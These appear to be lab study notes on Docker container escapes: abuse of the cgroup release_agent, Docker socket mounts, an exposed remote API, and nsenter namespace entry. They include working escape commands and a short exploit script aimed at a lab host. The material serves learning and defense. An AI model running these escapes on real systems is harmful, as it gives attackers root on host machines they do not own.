# Some docker vulnerabilities

### 1. Capabilities

Understanding Capabilities:

    Linux Capabilities: Root permissions assigned to processes or executables for granular privilege assignment.
    Docker Container Modes:
        User (Normal) mode
        Privileged mode
    Access Levels:
        User mode containers interact through the Docker Engine.
        Privileged mode containers bypass the Docker Engine, directly accessing the OS.
    Privileged Container Execution: Allows commands to be executed as root on the host.
    Listing Capabilities: Use capsh --print to list container capabilities.
    Example Capabilities: cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid, cap_setuid.

Example Exploit Using Mount Syscall:

    Mount cgroups: Create a directory and mount cgroups.
    Notify Kernel: Set up the kernel to execute upon cgroup release.
    Find Host Path: Retrieve and store the host path.
    Set Release Agent: Configure the release agent to point to the exploit.
    Create Exploit Script: Write commands into the exploit file.
    Command Execution: Ensure the exploit executes the desired command.
    Make Exploit Executable: Grant execute permissions to the exploit.
    Process Execution: Create a process in the cgroup to trigger the exploit.

Vulnerability Explanation:

    Create and Mount cgroup: Use cgroups to manage processes and mount them in the container.
    Notify Kernel on Release: Set kernel to execute code upon cgroup release.
    Retrieve Container Path: Find where container files are stored on the host.
    Configure Release Agent: Direct the release agent to the exploit.
    Create Shell Exploit: Turn the exploit into a shell on the host.
    Echo Host Flag: Execute a command to copy the host flag to the container.
    Set Executable Permissions: Make the exploit file executable.
    Trigger Process Execution: Store a process in cgroup to trigger exploit execution.

Sample Exploit [Reference](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.): 
```
1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

2. echo 1 > /tmp/cgrp/x/notify_on_release

3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

4. echo "$host_path/exploit" > /tmp/cgrp/release_agent

5. echo '#!/bin/sh' > /exploit

6. echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

7. chmod a+x /exploit

8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 2. Unix Socket to escape container
Unix Sockets 101:

    Concept: Similar to network sockets, used for Inter-process Communication (IPC) via filesystem.
    Performance: Unix sockets are faster than TCP/IP sockets, beneficial for databases like Redis.
    Permissions: Unix sockets use file system permissions.

Docker's Use of Sockets:

    Interaction: Docker commands (e.g., docker run) use a Unix socket.
    Permissions: Users must be part of the Docker group or root to run Docker commands.
    Verification: Use groups command to check Docker group membership.

Docker Socket in a Container:

    Access: Containers use the Docker Engine and have access to the Docker socket (docker.sock).
    Location: Typically found in /var/run (location can vary).

Exploiting Docker Socket:

    Confirm Permissions: Need root or Docker group permissions.
    Vulnerability: Create a new container and mount the host's filesystem into it.
    Command Breakdown:
        Upload Docker Image: Use a lightweight image like "alpine".
        Run Container: Mount host filesystem to /mnt in the new container: docker run -v /:/mnt.
        Interactive Mode: Use -it to run interactively.
        Image Selection: Use "alpine" image.
        Change Root Directory: Use chroot to set /mnt as the root: chroot /mnt.
        Shell Access: Run sh to gain a shell and execute commands.

Verification of Exploit:

    Success Check: After running the command, check if the host filesystem is mounted in the new container by listing contents of /.

### 3. Exposed REST API
The Docker Engine - TCP Sockets Edition:

    Communication: Docker can use TCP sockets for remote administration.
    Automation: Tools like Portainer or Jenkins can deploy containers remotely.

Vulnerability:

    Remote Accessibility: Docker Engine can listen on a port (default 2375) for remote access.
    Security Risk: Remotely accessible Docker Engine allows anyone to execute commands.

Enumeration:

    Nmap Scan: Check if the Docker Engine is accessible on port 2375.
    Example Scan: nmap -sV -p 2375 10.10.80.195

Interacting with Exposed Docker Daemon:

    Using curl: Verify access with curl http://10.10.80.195:2375/version
    Example Output: Details about Docker Engine and its components.

Executing Docker Commands on Target:

    Remote Command Execution: Use -H switch to direct commands to the target.
    Example Command: List containers with docker -H tcp://10.10.80.195:2375 ps

Next Steps:

    Possible Actions:
        Start, stop, or delete containers.
        Export container contents for analysis.
    Useful Commands:
        network ls: List container networks.
        images: List images used by containers.
        exec: Execute a command on a container.
        run: Run a container.

### 4. Abusing Namespace
Namespaces Overview:

    Definition: Segregate system resources like processes, files, and memory.
    Assignment: Each Linux process has a namespace and a Process Identifier (PID).
    Containerization: Achieved through namespaces; processes in different namespaces cannot see each other.

Example: Comparing Processes:

    Host System: Multiple processes running, e.g., Firefox and Gnome terminal.
    Container: Fewer processes, typically designed for a single task.
    Process Listing: Shows different numbers of processes on host and container, with PID 1 indicating the first process in the container.

Abusing Namespaces:

    cgroups: Previous vulnerabilities exploited using control groups.
    Host Interaction: Some containers share namespaces with the host for processes like debugging tools.

Exploit Using nsenter:

    Command: nsenter --target 1 --mount --uts --ipc --net /bin/bash
        This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "/sbin/init" process on the host
        --target 1: Execute in the namespace of process ID 1 (init).
        --mount: Enter the mount namespace of the target process.
        --uts: Share the same UTS namespace (hostname).
        --ipc: Enter the Inter-process Communication namespace.
        --net: Enter the network namespace to interact with network features.
        Execute Shell: Run a shell in the privileged namespace of the kernel.

Proof of Concept:

    Execution: Running nsenter command in the container allows access to the host.
    Verification: Successfully changing hostname to the host's name shows access to the host system.

